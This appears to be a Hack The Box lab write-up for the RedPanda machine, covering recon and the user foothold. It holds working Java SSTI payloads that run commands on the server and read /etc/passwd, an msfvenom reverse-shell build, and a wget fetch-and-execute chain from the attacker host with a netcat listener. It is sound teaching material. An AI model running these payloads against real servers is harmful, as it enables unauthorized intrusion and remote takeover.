# RedPanda HTB Writeup
## User 
Begin with a basic port scan:

```
# Nmap 7.92 scan initiated Fri Oct  7 12:43:05 2022 as: nmap -A -T4 -p- -sC -sC -oA nmap.results 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 07 Oct 2022 19:44:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 07 Oct 2022 19:44:37 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 07 Oct 2022 19:44:37 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/7%Time=63408191%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2007\x20Oct\x20
SF:2022\x2019:44:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Fr
SF:i,\x2007\x20Oct\x202022\x2019:44:37\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Fri,\x2007\x20Oct\x202022\x2019:44:37\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  7 12:44:32 2022 -- 1 IP address (1 host up) scanned in 86.75 seconds

```
Here we can see that ports 22 (SSH) and 8080 (Web Service, says http proxy) are open and running services. We can visit the web service/site and see a home page with an input labeled "search":
![Site Home](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/home_page.png)
When we supply an empty search query, we see a result for a "panda" named Greg, and the page is even so kind as to warn us of his "injection attacks"... interesting...
![Empty Search](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/empty_search.png)
Next we can run whatweb to see what type of tech is running on this web service:
```
$ whatweb http://10.10.11.170:8080
http://redpanda.htb:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```
We see that it's made with SpringBoot, but that was pretty obvious from the nmap scan. Let's do some more recon and fuzz the site to check for active directories:
```
$ wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://10.10.11.170:8080/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.170:8080/FUZZ
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000313:   500        0 L      1 W        86 Ch       "error"                                                                                     
000000717:   405        0 L      3 W        117 Ch      "search"                                                                                    
000000792:   200        32 L     97 W       987 Ch      "stats"                                                                                     

Total time: 0
Processed Requests: 951
Filtered Requests: 948
Requests/sec.: 0
```
Let's visit stats and check it out:

![Stats](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/stats.png)

We see that there are stats for two users, one of which has an export function to generate reports for users.... maybe an endpoint. 


![Export](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/user_stats_export.gif)


After further digging around with the search utility, we find that it may be vulnerable to an SSTI injection. This will allow us to inject a malicous payload into a template, possible allowing us to generate remote code execution on the server side. We test that theory by entering *{7+7} to see a result of 14 in the search query:

![SSTI check](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/ssti_check.gif)

This means that, because templates are use to generate web pages by combining fixed templates with data, we can inject template directives into this search as opposed to getting interpreted as data, which will allow us to manipulate the template engine and control the server.

We can use a payload provided by [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---retrieve-etcpasswd) SSTI injection cheatsheet, in order to Retrieve /etc/passwd as we know this is indeed a Java application because it is running SpringBoot

![etc_passwd](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/etc_passwd.png)

Now, let's go about generating a reverse shell. First I create a little elf helper for the reverse shell on the attacking machine:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.xxx.xxx LPORT=443 -f elf > ks.elf #Must supply your IP address (VPN from HTB) for the LHOST parameter
```
Okay so now we have this ks.elf exececutable somewhere on our attaching machine, so we can host an http server in this same directory to access this file from the SSTI:
```
$ python -m http.server 80 #Make sure this is where your elf binary is
```
Now we set up a netcat listener on our attacking machine to pick up the reverse shell when it gets sent from the executable through our SSTI commands. 

```
$ nc -lvnp 443
```
Then we can send these three commands (through the search bar on the webpage) one at a time to retrieve the msfvenom executable, modify its permissions, and execute it. At which point, we should retrive a reverse shell in our netcat session.


```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.X.X/ks.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./ks.elf")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./ks.elf")}
```

Here is an example of retrieving the shell in real time.


![RCE](https://github.com/KBSummers/HackTheBoxWriteups/blob/main/machines/RedPanda/images/RCE.gif)

## Priv Esc
